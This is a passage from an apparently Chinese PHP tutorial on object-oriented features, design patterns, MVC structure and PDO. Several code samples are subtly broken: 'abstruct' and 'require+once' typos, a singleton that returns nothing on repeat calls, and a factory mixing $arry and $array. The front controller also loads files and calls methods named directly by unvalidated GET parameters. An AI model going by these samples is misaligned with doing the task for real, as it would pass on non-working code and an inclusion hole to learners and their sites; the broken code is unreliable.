&#125;&#125;</code></pre><h3 id="7-重写"><a href="#7-重写" class="headerlink" title="7.重写"></a><strong>7.重写</strong></h3><p>重写就是子类重新定义父类继承给自己的属性或者方法</p><h4 id="1-重写的要求"><a href="#1-重写的要求" class="headerlink" title="1.重写的要求"></a><strong>1.重写的要求</strong></h4><p>(1)子类重写上级类成员时，访问控制修饰符不能权限更低（意思是可以更开放）</p><p>父类： public 子类: public<br>父类： protected 子类: protected&#x2F;public<br>父类： private  子类： 不能重写</p><p>(2) 子类重写父类的方法是要求形参保持一致</p><h3 id="8-final-class-和-final-method"><a href="#8-final-class-和-final-method" class="headerlink" title="8.final class 和 final method"></a><strong>8.final class 和 final method</strong></h3><p>最终类：定义一个类，这个类不允许别的类去继承</p><p>最终方法：定义一个方法，这个方法不允许下级类去重写</p><h2 id="三、设计模式"><a href="#三、设计模式" class="headerlink" title="三、设计模式"></a><strong>三、设计模式</strong></h2><h3 id="1-什么叫设计模式"><a href="#1-什么叫设计模式" class="headerlink" title="1.什么叫设计模式"></a><strong>1.什么叫设计模式</strong></h3><p>是面向对象程序设计中“常见任务”中的代码模式的经验总结</p><h3 id="2-工厂模式"><a href="#2-工厂模式" class="headerlink" title="2.工厂模式"></a><strong>2.工厂模式</strong></h3><p>工厂模式就是设计这样一个类（F），该类可以接受一个参数，这个参数代表某个类名（B），然后这个类（F）就能生成所传入的类（B）所对应的对象</p><p>可见工厂类的目的就是生产各种不同类的对象</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Factory&#123;    static function getObject($class_name)&#123;        $obj = new $class_name();        return $obj;    &#125;&#125;</code></pre><h3 id="3-单例模式"><a href="#3-单例模式" class="headerlink" title="3.单例模式"></a><strong>3.单例模式</strong></h3><p>设计一个类，让这个类只能得到一个单例对象，那么这个类就叫做单例类，生成出来的对象就叫做单例对象</p><p>那么怎么实现呢？我们的想法就是，我们自定义一个实例化的接口，并且在接口中做判断，这样就能控制只能实例化一次</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Single&#123;    static $s = null;    function __construct()&#123;    &#125;    function getOne()&#123;        if(empty(self::$s))&#123;            self::$s = new self();            return self::$s;        &#125;        else&#123;            self::$s;        &#125;    &#125;&#125;</code></pre><h2 id="四、抽象类和抽象方法"><a href="#四、抽象类和抽象方法" class="headerlink" title="四、抽象类和抽象方法"></a><strong>四、抽象类和抽象方法</strong></h2><h3 id="1-抽象类"><a href="#1-抽象类" class="headerlink" title="1.抽象类"></a><strong>1.抽象类</strong></h3><h4 id="1-概念：-2"><a href="#1-概念：-2" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>抽象类就是一个不能实例化的类</p><p>形式：</p><pre><code class="hljs">abstruct class 类名&#123;    类成员&#125;</code></pre><h4 id="2-不能实例化，那么抽象类有什么作用？"><a href="#2-不能实例化，那么抽象类有什么作用？" class="headerlink" title="2.不能实例化，那么抽象类有什么作用？"></a><strong>2.不能实例化，那么抽象类有什么作用？</strong></h4><p>用于定义一些类的共同上级类，让这些类都具有某种共同的特征（其实就是强制子类实现某种属性或者方法）</p><h3 id="2-抽象方法"><a href="#2-抽象方法" class="headerlink" title="2.抽象方法"></a><strong>2.抽象方法</strong></h3><p>抽象方法是一个什么都不做的方法，只有函数头没有函数体，形式：</p><p>abstruct function 方法名 (形参);</p><p>和抽象类类似，抽象方法主要用于规定子类一定要实现的方法，但是没有规定怎么实现</p><h3 id="3-抽象类和抽象方法的关系"><a href="#3-抽象类和抽象方法的关系" class="headerlink" title="3.抽象类和抽象方法的关系"></a><strong>3.抽象类和抽象方法的关系</strong></h3><p>(1)一个类中有抽象方法那么这个类必须声明为抽象类<br>(2)一个类继承一个抽象类那么就必须实现所有的抽象方法，除非这个类也是作为一个抽象类<br>(3)子类实现父类的抽象方法的时候访问控制修饰符权限不能降低（可以更加开放），并且形参需要一致</p><h2 id="五、重载技术-overloading"><a href="#五、重载技术-overloading" class="headerlink" title="五、重载技术 overloading"></a><strong>五、重载技术 overloading</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a><strong>1.概念</strong></h3><p>php 中的重载指的是，当我们使用对象（或者类）去访问一些不存在的属性或者方法的时候，就会使用某些预先定义好的特殊方法来应对这种情况</p><p>可见PHP 的重载是内部为了应对非法使用属性或者方法的措施</p><h3 id="2-重载的分类"><a href="#2-重载的分类" class="headerlink" title="2.重载的分类"></a><strong>2.重载的分类</strong></h3><p>1.属性重载<br>2.方法重载</p><h3 id="3-属性重载："><a href="#3-属性重载：" class="headerlink" title="3.属性重载："></a><strong>3.属性重载：</strong></h3><p>属性就是变量，于是属性也就有和变量一样的四种操作 取值 赋值 isset()判断  unset()销毁<br>于是，属性重载就是在类中预先定义了四种特殊方法，来应对这四种对属性的可能错误的操作</p><pre><code class="hljs">__set($name,$value)__get($name)__isset($name)__unset($name)</code></pre><h4 id="1-set-name-value"><a href="#1-set-name-value" class="headerlink" title="1.__set($name,$value)"></a><strong>1.<code>__set($name,$value)</code></strong></h4><p>在给一个不存在的属性赋值时候会自动调用，$name 会自动赋值为那个不存在的属性，$value 会赋值为那个不存在的属性的值，我们就能利用这个特性实现动态属性（用什么就实现什么，无需提前定义）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    public $p1 = 1;    public $prop_list = array();    function __set($name, $value)    &#123;        // TODO: Implement __set() method.        $this-&gt;prop_list[$name] = $value;    &#125;&#125;$a = new A();$a-&gt;p1 = 11;$a-&gt;p2 = 22;var_dump($a);</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">object(A)[1]  public &#39;p1&#39; =&gt; int 11  public &#39;prop_list&#39; =&gt;     array (size=1)      &#39;p2&#39; =&gt; int 22     </code></pre><h4 id="2-get-name"><a href="#2-get-name" class="headerlink" title="2.__get($name)"></a><strong>2.<code>__get($name)</code></strong></h4><p>在给一个不存在的属性取值时候会自动调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    public $p1 = 1;    public $prop_list = array();    function __set($name, $value)    &#123;        // TODO: Implement __set() method.        $this-&gt;prop_list[$name] = $value;    &#125;    function __get($name)    &#123;        // TODO: Implement __get() method.        if(!empty($this-&gt;prop_list[$name])) &#123;            return $this-&gt;prop_list[$name];        &#125;else&#123;            return &quot;该属性不存在&quot;;        &#125;    &#125;&#125;$a = new A();$a-&gt;p1 = 11;$a-&gt;p2 = 22;echo $a-&gt;p2;</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">22</code></pre><h4 id="3-isset-name"><a href="#3-isset-name" class="headerlink" title="3.__isset($name)"></a><strong>3.<code>__isset($name)</code></strong></h4><p>对一个不存在的属性使用 isset() 方法的时候调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class A&#123;    public $p1 = 1;    public $prop_list = array();    function __set($name, $value)    &#123;        // TODO: Implement __set() method.        $this-&gt;prop_list[$name] = $value;    &#125;    function __get($name)    &#123;        // TODO: Implement __get() method.        if(!empty($this-&gt;prop_list[$name])) &#123;            return $this-&gt;prop_list[$name];        &#125;else&#123;            return &quot;该属性不存在&quot;;        &#125;    &#125;    function __isset($name)    &#123;        // TODO: Implement __isset() method.        if(isset($this-&gt;prop_list[$name]))&#123;            return true;        &#125;else&#123;            return false;        &#125;    &#125;&#125;$a = new A();$a-&gt;p1 = 11;$a-&gt;p2 = 22;echo isset($a-&gt;p2);</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1</code></pre><h4 id="4-unset-name"><a href="#4-unset-name" class="headerlink" title="4.__unset($name)"></a><strong>4.<code>__unset($name)</code></strong></h4><p>对一个不存在的属性使用 unset() 方法的时候调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    public $p1 = 1;    public $prop_list = array();    function __set($name, $value)    &#123;        // TODO: Implement __set() method.        $this-&gt;prop_list[$name] = $value;    &#125;    function __get($name)    &#123;        // TODO: Implement __get() method.        if(!empty($this-&gt;prop_list[$name])) &#123;            return $this-&gt;prop_list[$name];        &#125;else&#123;            return &quot;该属性不存在&quot;;        &#125;    &#125;    function __isset($name)    &#123;        // TODO: Implement __isset() method.        if(isset($this-&gt;prop_list[$name]))&#123;            return true;        &#125;else&#123;            return false;        &#125;    &#125;    function __unset($name)    &#123;        // TODO: Implement __unset() method.        if(isset($this-&gt;prop_list[$name]))&#123;            unset($this-&gt;prop_list[$name]);        &#125;else&#123;            echo &quot;error&quot;;        &#125;    &#125;&#125;$a = new A();$a-&gt;p1 = 11;$a-&gt;p2 = 22;unset($a-&gt;p2);</code></pre><h3 id="4-方法重载："><a href="#4-方法重载：" class="headerlink" title="4.方法重载："></a><strong>4.方法重载：</strong></h3><p>方法重载涉及到两个函数  __call()  __callstatic()</p><p>当对一个对象未定义的方法进行调用的时候会自动调用 __call($name,$arguments)<br>当对一个类未定义的静态方法进行调用的时候会自动调用 __callstatic($name,$arguments)</p><pre><code class="hljs">$name 不存在的函数名$arguments 所有参数组成的数组</code></pre><h4 id="1-call-name-arguments"><a href="#1-call-name-arguments" class="headerlink" title="1.__call($name,$arguments)"></a><strong>1.<code>__call($name,$arguments)</code></strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    function __call($name, $arguments)    &#123;        // TODO: Implement __call() method.        if($name == &quot;eat&quot;)&#123;            $num = count($arguments);            if($num ==1)&#123;                $this-&gt;hezhou($arguments[0]);            &#125;            if($num ==2)&#123;                $this-&gt;chifan($arguments[0],$arguments[1]);            &#125;        &#125;    &#125;    function hezhou($zhou)&#123;        echo &quot;zheng zai he $zhou &lt;br&gt;&quot;;    &#125;    function chifan($fan,$tools)&#123;        echo &quot;zheng zai yong $tools chi $fan &lt;br&gt;&quot;;    &#125;&#125;$p = new A();$p-&gt;eat(&quot;zhou&quot;);$p-&gt;eat(&quot;fan&quot;,&quot;kuaizi&quot;);</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">zheng zai he zhouzheng zai yong kuaizi chi fan </code></pre><h4 id="2-callstatic-name-arguments"><a href="#2-callstatic-name-arguments" class="headerlink" title="2.__callstatic($name,$arguments)"></a><strong>2.<code>__callstatic($name,$arguments)</code></strong></h4><p>这个完全类似，我就不重复讲了</p><h2 id="六、接口"><a href="#六、接口" class="headerlink" title="六、接口"></a><strong>六、接口</strong></h2><h3 id="1-概念：什么是接口"><a href="#1-概念：什么是接口" class="headerlink" title="1.概念：什么是接口"></a><strong>1.概念：什么是接口</strong></h3><p>接口是比抽象类更抽象的一种类似类的结构，接口中只有两种成员，一种是常量，另一种是抽象方法</p><p><strong>形式：</strong></p><pre><code class="hljs">interface class A&#123;    const PI = 3.14;    function B(); //接口中的方法都是抽象方法，不用写 abstract&#125;</code></pre><h3 id="2-为什么需要接口"><a href="#2-为什么需要接口" class="headerlink" title="2.为什么需要接口"></a><strong>2.为什么需要接口</strong></h3><p>面向对象的单继承是对现实世界多继承现象的一种妥协（为了不使的代码过于复杂），但是还是不免有多继承的情形需要描述，于是接口技术就成了对这种妥协的一种弥补（接口能够实现多继承），只不过我们队接口的继承换了一个名字叫做“实现”—&gt; implements</p><pre><code class="hljs">class 类名 implements 接口名&#123;    成员定义&#125;</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpinterface Player&#123;//音乐播放器接口    function play();    function next();    function prev();    function stop();&#125;interface USBset&#123;//USB接口    const WIDTH = 12;    const HEIGHT = 5;    function data_in();    function data_out();&#125;class MP3Player implements Player,USBset&#123;    function play()&#123;&#125;    function next()&#123;&#125;    function prev()&#123;&#125;    function stop()&#123;&#125;    function data_in()&#123;&#125;    function data_out()&#123;&#125;&#125;</code></pre><h3 id="3-关于接口的其他细节"><a href="#3-关于接口的其他细节" class="headerlink" title="3.关于接口的其他细节"></a><strong>3.关于接口的其他细节</strong></h3><p>1.一个类在实现接口的同时也能继承父类<br>2.接口之间也可以相互继承<br>3.接口中的常量和抽象方法只能是 Public 无需写 abstruct </p><h2 id="七、MVC模式"><a href="#七、MVC模式" class="headerlink" title="七、MVC模式"></a><strong>七、MVC模式</strong></h2><h3 id="1-项目设计的基本流程"><a href="#1-项目设计的基本流程" class="headerlink" title="1.项目设计的基本流程"></a><strong>1.项目设计的基本流程</strong></h3><p>1.需求分析<br>人员：项目经理，技术总监<br>目标：写出项目需求说明书</p><p>2.项目概要和详细设计<br>人员：项目经理，技术总监<br>目标：概要设计说明书和详细设计说明书</p><p>3.界面设计<br>人员： 设计师（美工）<br>目标：界面设计效果图</p><p>4.前端页面制作<br>人员：前端工程师<br>目标：html css js</p><p>5.前后台功能实现<br>人员：软件工程师<br>目标：php 代码</p><p>6.功能测试<br>人员：测试工程师<br>目标：测试功能，反馈问题并最终得到可用产品</p><p>7.发布上线，运行维护<br>人员：运维人员的工作<br>目标：保证系统的正常运行</p><h3 id="2-显示与逻辑相分离的思想"><a href="#2-显示与逻辑相分离的思想" class="headerlink" title="2.显示与逻辑相分离的思想"></a><strong>2.显示与逻辑相分离的思想</strong></h3><p><strong>需求：</strong></p><p>显示当前时间，要求有三种显示形式：<br>1.显示年月日<br>2.显示时分秒<br>3.两者都 显示</p><h4 id="1-显示与逻辑混合"><a href="#1-显示与逻辑混合" class="headerlink" title="1.显示与逻辑混合"></a><strong>1.显示与逻辑混合</strong></h4><p>如果我们想实现这个功能写成一个页面应该是非常简单的，代码如下：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;html&gt;&lt;body&gt;    &lt;p align = right&gt;        &lt;a href=&quot;?type=1&quot;&gt;形式一&lt;/a&gt;        &lt;a href=&quot;?type=2&quot;&gt;形式一&lt;/a&gt;        &lt;a href=&quot;?type=3&quot;&gt;形式一&lt;/a&gt;        &lt;hr&gt;    &lt;/p&gt;&lt;?phpif(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;1&quot;)&#123;    $t1 = date(&quot;Y年m月d日&quot;);&#125;elseif(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;2&quot;)&#123;    $t1 = date(&quot;H:i:s&quot;);&#125;else&#123;    $t1 = date(&quot;Y年m月d日 H:i:s&quot;);&#125;echo &quot;&lt;h1&gt;$t1&lt;/h1&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="2-显示与逻辑相分离"><a href="#2-显示与逻辑相分离" class="headerlink" title="2.显示与逻辑相分离"></a><strong>2.显示与逻辑相分离</strong></h4><p>我们可以将显示与逻辑放到两个文件中去</p><p><strong>PHP 文件</strong></p><pre><code class="hljs">show-time.php&lt;?phpif(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;1&quot;)&#123;    $t1 = date(&quot;Y年m月d日&quot;);&#125;elseif(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;2&quot;)&#123;    $t1 = date(&quot;H:i:s&quot;);&#125;else&#123;    $t1 = date(&quot;Y年m月d日 H:i:s&quot;);&#125;include &quot;./show-time.html&quot;;?&gt;</code></pre><p><strong>HTML文件</strong></p><pre><code class="hljs">show-time.html&lt;html&gt;&lt;body&gt;&lt;p align = right&gt;    &lt;a href=&quot;?type=1&quot;&gt;形式一&lt;/a&gt;    &lt;a href=&quot;?type=2&quot;&gt;形式一&lt;/a&gt;    &lt;a href=&quot;?type=3&quot;&gt;形式一&lt;/a&gt;&lt;hr&gt;&lt;/p&gt;&lt;?phpecho &quot;&lt;h1&gt;$t1&lt;/h1&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这样依然可以运行</p><h4 id="3-模板技术"><a href="#3-模板技术" class="headerlink" title="3.模板技术"></a><strong>3.模板技术</strong></h4><p>在很多的网站应用中，都要实现这样一种需求：整体上功能不变，但是界面经常要更换为不同的风格样式</p><p>在显示与逻辑相分离的技术基础上，做成多分不同的 HTML ，再通过用户的选择更换HTML来显示，那这些HTML 就构成了模板</p><h3 id="3-MVC框架原理"><a href="#3-MVC框架原理" class="headerlink" title="3.MVC框架原理"></a><strong>3.MVC框架原理</strong></h3><h4 id="1-概念：-3"><a href="#1-概念：-3" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>M: Model 模型<br>V: View  视图<br>C：Controller 控制器</p><h4 id="2-MVC-的简单演示"><a href="#2-MVC-的简单演示" class="headerlink" title="2.MVC 的简单演示"></a><strong>2.MVC 的简单演示</strong></h4><p>我们假设求时间是一个非常复杂的工作，就像真实项目中的取数据要调用数据库模块一样，于是将求时间的部分抽象成 model 模块，通过 controller 模块调用 Model 来实现求时间的功能，然后再将结果放到 view 模块中</p><p><strong>示例代码：</strong></p><p><strong>show-time-controller.php</strong></p><pre><code class="hljs">&lt;?phprequire_once &quot;show-time-model.php&quot;;if(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;1&quot;)&#123;    $obj = new GetTimeModel();    $t1 = $obj-&gt;GetDate();&#125;elseif(!empty($_GET[&#39;type&#39;]) &amp;&amp; $_GET[&#39;type&#39;] == &quot;2&quot;)&#123;    $obj = new GetTimeModel();    $t1 = $obj-&gt;GetTime();&#125;else&#123;    $obj = new GetTimeModel();    $t1 = $obj-&gt;GetDateTime();&#125;include &quot;./show-time-view.html&quot;;?&gt;</code></pre><p>后面我们会将其改成一个类，根据传入的不同参数调用这个类的不同方法</p><p><strong>show-time-model.php</strong></p><pre><code class="hljs">&lt;?phpclass GetTimeModel&#123;    function GetDate()&#123;        return Date(&quot;Y年m月d日&quot;);    &#125;    function GetTime()&#123;        return  Date(&quot;H:i:s&quot;);    &#125;    function GetDateTime()&#123;        return Date(&quot;Y年m月d日 H:i:s&quot;);    &#125;&#125;</code></pre><p><strong>show-time-view.html</strong></p><pre><code class="hljs">&lt;html&gt;&lt;body&gt;&lt;p align = right&gt;    &lt;a href=&quot;?type=1&quot;&gt;形式一&lt;/a&gt;    &lt;a href=&quot;?type=2&quot;&gt;形式一&lt;/a&gt;    &lt;a href=&quot;?type=3&quot;&gt;形式一&lt;/a&gt;&lt;hr&gt;&lt;/p&gt;&lt;?phpecho &quot;&lt;h1&gt;$t1&lt;/h1&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="4-MVC思想框架"><a href="#4-MVC思想框架" class="headerlink" title="4.MVC思想框架"></a><strong>4.MVC思想框架</strong></h4><p><strong>如图所示：</strong></p><p><strong>解释：</strong></p><p>1.浏览器直接请求的是控制器文件，也只有控制器文件知道用户给了什么（请求数据）以及用户真正要的是什么（目标）</p><p>2.控制器根据用户的请求做两件事<br>（1）调用哪个模型<br>（2）获取什么数据<br>（3）显示数据到哪个视图中（其实就是载入视图文件）</p><p>3.模型文件：只根据控制器的调用生产数据并返回给控制器</p><p>4.视图文件：只负责显示数据（数据显示在页面的哪里以及显示的效果），并且是由控制器决定显示哪些数据</p><p>5.模型文件和视图文件没有直接的关系</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MVC%E7%BB%93%E6%9E%84%E5%9B%BE.png" alt="此处输入图片的描述"></p><p><strong>再直观一点我们可以看一下类比图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MVC%20%E7%B1%BB%E6%AF%94%E5%9B%BE1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MVC%E7%B1%BB%E6%AF%94%E5%9B%BE2.png" alt="此处输入图片的描述"></p><h3 id="4-Model-层的典型实现"><a href="#4-Model-层的典型实现" class="headerlink" title="4.Model 层的典型实现"></a><strong>4.Model 层的典型实现</strong></h3><h4 id="1-模型层的功能与典型的代码模式"><a href="#1-模型层的功能与典型的代码模式" class="headerlink" title="1.模型层的功能与典型的代码模式"></a><strong>1.模型层的功能与典型的代码模式</strong></h4><pre><code class="hljs">class ModelDemo&#123;    function f1()&#123;        $result = 获取数据库中的数据1；        return $result;    &#125;         function f2()&#123;        $result = 获取数据库中的数据2；        return $result;    &#125;        ...&#125; </code></pre><h4 id="2-控制器层的功能与典型的代码模式"><a href="#2-控制器层的功能与典型的代码模式" class="headerlink" title="2.控制器层的功能与典型的代码模式"></a><strong>2.控制器层的功能与典型的代码模式</strong></h4><p>1.载入模型类文件<br>2.对模型类实例化以获得相应的对象<br>3.调用模型类对象的方法以获得相应的数据（不同的方法能获得不同的数据）</p><pre><code class="hljs">require_once &quot;模型文件&quot;class xxxController&#123;    function xxxAction()&#123;        $obj = new 模型类();        $res1 = $obj-&gt;方法1();            &#125;        function yyyAction()&#123;        $obj = new 模型类();        $res2 = $obj-&gt;方法2();    &#125;        ...&#125;$controller = new xxxController();$action = !empty($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &quot;Index&quot;;$action = $action.&quot;Action&quot;;$controller-&gt;$action();</code></pre><p>我们对模型文件和模型类命名有如下习惯</p><p>类定义：</p><pre><code class="hljs">class xxxModel&#123;    ...&#125;</code></pre><p>文件名：  </p><pre><code class="hljs">xxxModel.class.php </code></pre><h4 id="3-模型类的单例工厂"><a href="#3-模型类的单例工厂" class="headerlink" title="3.模型类的单例工厂"></a><strong>3.模型类的单例工厂</strong></h4><p>我们在之前的操作中都是每一个控制器的每一个方法都会实例化一个模型类，这在我们看来是没有必要的，一个模型类就能实现所有的功能了，于是我们利用之前学过的技术，创建一个模型类的单例工厂，实现我们只要传入我们想要实例化的模型类就能得到该模型类的实例化对象，并且，这个对象只会创建一次。</p><p><strong>示例代码：</strong></p><p>ModelFactory.class.php</p><pre><code class="hljs">class ModelFactory&#123;    static $arry = array();    static function M($class_name)&#123;        if(empty(self::$array[$class_name]))&#123;            self::$array[$class_name] = new $class_name();        &#125;        return self::$array[$class_name];    &#125;&#125;</code></pre><p>我们只要将其包含到 xxxController.class.php 文件里面就可以了,从而可以代替上面代码中的 $obj &#x3D; new 模型类(); 这一句话</p><h4 id="4-整个模型层的类库结构图"><a href="#4-整个模型层的类库结构图" class="headerlink" title="4.整个模型层的类库结构图"></a><strong>4.整个模型层的类库结构图</strong></h4><p>在应用中通常每个数据表（table）都要使用一个模型类文件xxxModel ，来对这个表所需的数据进行相应的操作，比如用户表：注册、删除、登录、修改密码、修改常规信息、显示所有用户、查看单个用户信息</p><p>即，模型层和数据库中的表有如下大致关系</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A8%A1%E5%9E%8B%E7%B1%BB%E5%92%8C%E6%A0%87%E7%9A%84%E5%85%B3%E7%B3%BB3.png" alt="此处输入图片的描述"></p><h3 id="5-Controller-层的典型实现"><a href="#5-Controller-层的典型实现" class="headerlink" title="5.Controller 层的典型实现"></a><strong>5.Controller 层的典型实现</strong></h3><h4 id="1-控制器类的细节"><a href="#1-控制器类的细节" class="headerlink" title="1.控制器类的细节"></a><strong>1.控制器类的细节</strong></h4><p><strong>1.功能</strong></p><p>用于获取用户的请求数据，根据用户的数据来选择控制器类对应的方法，这个方法会实例化模型类，然后调用对应的方法，获取数据，并再是图中显示</p><p><strong>2.划分：</strong></p><p>控制器通常按照应用的模块（功能组）进行划分，一个控制对应一个模块（页面）的不同的操作，比如用户界面的增删改查，实际上可以看成是一个模块，使用一个控制器（里面针对不同的功能实现不同的方法），商品列表的各种操作可以看成是一个模块，使用另一个控制器。</p><p><strong>3.与模型的区别：</strong></p><p>通常模型是严格按照表进行划分的，一个表对应一个模型类，对一个表进行各种的操作</p><p><strong>4.动作</strong></p><p><strong>动作是什么呢？ 动作就是用户在网页上所做的能跟服务器打交道的行为（比如点击链接或者提交表单）<br>在代码级别，页面上的任何一个动作都对应着控制器中的一个方法</strong></p><p>我们可以通过传参的方式进行动作的选择,这里有一个点可以优化，就是如果我们将传参的值和控制器的类的方法名称对应起来我们就能实现一行代码解决这个选择问题，并且扩展也非常的方便。</p><h4 id="2-基础控制器类"><a href="#2-基础控制器类" class="headerlink" title="2.基础控制器类"></a><strong>2.基础控制器类</strong></h4><p>为什么需要基础控制器类，因为我们想统一设置所有控制器中的一些东西，比如编码和某些都需要功能，于是我们想要创建一个所有控制器的上级，这个上级类就是基础控制器类，或者说是控制器基类。</p><h3 id="6-View-层的典型实现"><a href="#6-View-层的典型实现" class="headerlink" title="6.View 层的典型实现"></a><strong>6.View 层的典型实现</strong></h3><p><strong>1.视图层的功能：</strong></p><p>展示页面的静态内容以及相关的变量数据</p><p><strong>2.数据的分类：</strong></p><p>(1)普通标量数据</p><pre><code class="hljs">&lt;?php echo &quot;xx&quot;?&gt;、</code></pre><p>(2)数组数据</p><p>一维数组： </p><pre><code class="hljs">&lt;?php echo $arr[&#39;xxx&#39;]; ?&gt;</code></pre><p>二维数组：</p><pre><code class="hljs">&lt;?php foreach ($arr_list as $key=&gt;$arr)&#123; ?&gt;&lt;?php echo $arr[&#39;字段1&#39;]; ?&gt;&lt;?php echo $arr[&#39;字段2&#39;]; ?&gt;&lt;?php echo $arr[&#39;字段3&#39;]; ?&gt;&lt;?php echo $arr[&#39;字段4&#39;]; ?&gt;&lt;?php &#125; ?&gt;</code></pre><p><strong>(3)对象数据：</strong></p><pre><code class="hljs">&lt;?php echo $obj-&gt;属性?&gt;</code></pre><h2 id="八、关于-MVC-项目的其他常见做法"><a href="#八、关于-MVC-项目的其他常见做法" class="headerlink" title="八、关于 MVC 项目的其他常见做法"></a><strong>八、关于 MVC 项目的其他常见做法</strong></h2><h3 id="1-请求分发器（前端控制器的实现）"><a href="#1-请求分发器（前端控制器的实现）" class="headerlink" title="1.请求分发器（前端控制器的实现）"></a><strong>1.请求分发器（前端控制器的实现）</strong></h3><p>我们发现我们很多的控制器命名规则以及他的实例化的方法都是一样的，比如 UserController 和 ProductController ,于是我们就想能不能将其抽象出来，我们想寻找一个变量表示 User 和 Product ,并且这个变量也就能表示这个模块（因为我们当时约定的命名规则就是模块名加 Controller）,将这个模块的选择权交给用户</p><p>我们从每个控制器中抽象出来一部分，放在一个Index.php 中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%89%8D%E7%AB%AF%E5%88%86%E5%8F%91%E5%99%A8.png" alt="此处输入图片的描述"></p><p><strong>index.php</strong></p><pre><code class="hljs">require_once &quot;./ModelFactory.class.php&quot;;require_once &quot;./BaseController.class.php&quot;;$ctrl = !empty($_GET[&#39;ctrl&#39;]) ? $_GET[&#39;ctrl&#39;] : &quot;User&quot;;require_once &quot;./&#123;$ctrl&#125;Model.class.php&quot;;require+once &quot;./&#123;$ctrl&#125;Controller.class.php&quot;;$ctrl_name = $ctrl.&quot;Controller&quot;;$controller = new $ctrl_name();$action = !empty($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &quot;Index&quot;;$action = $action.&quot;Action&quot;;$controller-&gt;$action();</code></pre><p>这个文件写好以后，在每个控制器中的下面这部分代码就不需要了，就会变得非常的干净</p><pre><code class="hljs">require_once &quot;./ModelFactory.class.php&quot;;require_once &quot;./BaseController.class.php&quot;;$ctrl = !empty($_GET[&#39;ctrl&#39;]) ? $_GET[&#39;ctrl&#39;] : &quot;User&quot;;require_once &quot;./&#123;$ctrl&#125;Model.class.php&quot;;require+once &quot;./&#123;$ctrl&#125;Controller.class.php&quot;;$controller = new $ctrl_name();$action = !empty($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &quot;Index&quot;;$action = $action.&quot;Action&quot;;$controller-&gt;$action();</code></pre><h3 id="2-目录结构的设定"><a href="#2-目录结构的设定" class="headerlink" title="2.目录结构的设定"></a><strong>2.目录结构的设定</strong></h3><p>我们一个项目不可能只有一个文件夹，那样的话文件太多太杂没法看，非常不利于后期的维护，于是我们需要对文件进行按照类别的划分</p><p>站点根目录&#x2F;</p><pre><code class="hljs">    /Models    /Controllers    /Views    /Bases    index.php    </code></pre><h2 id="九、PDO-数据对象"><a href="#九、PDO-数据对象" class="headerlink" title="九、PDO 数据对象"></a><strong>九、PDO 数据对象</strong></h2><h3 id="1-概念：-4"><a href="#1-概念：-4" class="headerlink" title="1.概念："></a><strong>1.概念</strong>：</h3><p>PDO 是已经写好的数据库工具类，通过他能对数据库进行各种操作，非常的方便快捷</p><h3 id="2-特点："><a href="#2-特点：" class="headerlink" title="2.特点："></a><strong>2.特点：</strong></h3><p>(1)他能操纵各种的数据库 ,mysql oracle sybase…<br>(2)他能实现除了增删改查以外的更多功能，比如事务<br>(3)他对不同的数据库有着统一的应用方式，在使用的时候无需考虑不同数据库SQL语法的细节差异<br>(4)PDO 实际上是一个类，我们使用的时候就需要new 一个对象出来</p><h3 id="3-PHP-代码中常见的操作数据库的情况"><a href="#3-PHP-代码中常见的操作数据库的情况" class="headerlink" title="3.PHP 代码中常见的操作数据库的情况"></a><strong>3.PHP 代码中常见的操作数据库的情况</strong></h3><p>(1)连接数据库得到数据库的连接资源<br>(2)执行各种sql 语句得到布尔值或者结果集<br>(3)对结果集的数据进行取用，遍历 一般就是 fetch</p><h3 id="4-PDO-系统的逻辑结构"><a href="#4-PDO-系统的逻辑结构" class="headerlink" title="4.PDO 系统的逻辑结构"></a><strong>4.PDO 系统的逻辑结构</strong></h3><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PDO%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84.png" alt="此处输入图片的描述"></p><p>要想操作不同的数据库，就要在 php.ini 中打开对应的PDO模块</p><h3 id="5-POD-使用"><a href="#5-POD-使用" class="headerlink" title="5.POD 使用"></a><strong>5.POD 使用</strong></h3><h4 id="1-连接数据库"><a href="#1-连接数据库" 